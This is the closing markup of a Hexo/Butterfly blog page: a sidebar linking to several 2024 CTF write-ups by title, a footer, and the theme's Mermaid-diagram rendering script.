href="/2024/09/11/WMCTF%202024%20Forensics%20%E5%A4%8D%E7%8E%B0/" title="WMCTF 2024 Forensics 复现"><img src="/images/WMCTF_2024/cover.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="WMCTF 2024 Forensics 复现"/></a><div class="content"><a class="title" href="/2024/09/11/WMCTF%202024%20Forensics%20%E5%A4%8D%E7%8E%B0/" title="WMCTF 2024 Forensics 复现">WMCTF 2024 Forensics 复现</a><time datetime="2024-09-11T11:53:14.000Z" title="Created 2024-09-11 19:53:14">2024-09-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/09/08/%E9%95%BF%E5%9F%8E%E6%9D%AF%202024%20MISC%20Writeup/" title="长城杯 2024 MISC Writeup"><img src="/images/%E9%95%BF%E5%9F%8E%E6%9D%AF2024/cover.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="长城杯 2024 MISC Writeup"/></a><div class="content"><a class="title" href="/2024/09/08/%E9%95%BF%E5%9F%8E%E6%9D%AF%202024%20MISC%20Writeup/" title="长城杯 2024 MISC Writeup">长城杯 2024 MISC Writeup</a><time datetime="2024-09-08T10:23:47.000Z" title="Created 2024-09-08 18:23:47">2024-09-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/08/26/NepCTF%202024%20MISC%20Writeup/" title="NepCTF 2024 MISC Writeup"><img src="/images/NepCTF_2024/cover.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="NepCTF 2024 MISC Writeup"/></a><div class="content"><a class="title" href="/2024/08/26/NepCTF%202024%20MISC%20Writeup/" title="NepCTF 2024 MISC Writeup">NepCTF 2024 MISC Writeup</a><time datetime="2024-08-26T03:42:11.000Z" title="Created 2024-08-26 11:42:11">2024-08-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/08/21/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%202024%20MISC%20Writeup/" title="巅峰极客 2024 MISC Writeup"><img src="/images/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024/cover.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="巅峰极客 2024 MISC Writeup"/></a><div class="content"><a class="title" href="/2024/08/21/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%202024%20MISC%20Writeup/" title="巅峰极客 2024 MISC Writeup">巅峰极客 2024 MISC Writeup</a><time datetime="2024-08-21T06:40:28.000Z" title="Created 2024-08-21 14:40:28">2024-08-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/08/10/MoeCTF%202024%20Writeup/" title="MoeCTF 2024 Writeup"><img src="/images/MoeCTF_2024/MoeCTF_2024.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="MoeCTF 2024 Writeup"/></a><div class="content"><a class="title" href="/2024/08/10/MoeCTF%202024%20Writeup/" title="MoeCTF 2024 Writeup">MoeCTF 2024 Writeup</a><time datetime="2024-08-10T06:25:36.000Z" title="Created 2024-08-10 14:25:36">2024-08-10</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By w8nn9z</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.14.0-b3"></script><script src="/js/main.js?v=4.14.0-b3"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.35/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
+  const runMermaid = (ele) => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    Array.from(ele).forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = '%%{init:{ \'theme\':\'' + theme + '\'}}%%\n'
+      const mermaidID = 'mermaid-' + index
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+
+      const renderV10 = () => {
+        renderFn.then(({svg}) => {
+          mermaidSrc.insertAdjacentHTML('afterend', svg)
+        })
+      }
+
+      const renderV9 = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      typeof renderFn === 'string' ? renderV9(renderFn) : renderV10()
+    })
+  }
+
+  const codeToMermaid = () => {
+    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
+    if (codeMermaidEle.length === 0) return
+    
+    codeMermaidEle.forEach(ele => {
+      const newEle = document.createElement('div')
+      newEle.className = 'mermaid-wrap'
+      newEle.innerHTML = `<pre class="mermaid-src" hidden>${ele.textContent}</pre>`
+      ele.parentNode.replaceWith(newEle)
+    })
+  }
+
+  const loadMermaid = () => {
+    if (false) codeToMermaid()
+    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+    if ($mermaid.length === 0) return
+
+    const runMermaidFn = () => runMermaid($mermaid)
+    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
+    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid@10.9.0/dist/mermaid.min.js').then(runMermaidFn)
+  }
+  
+  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script></div><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
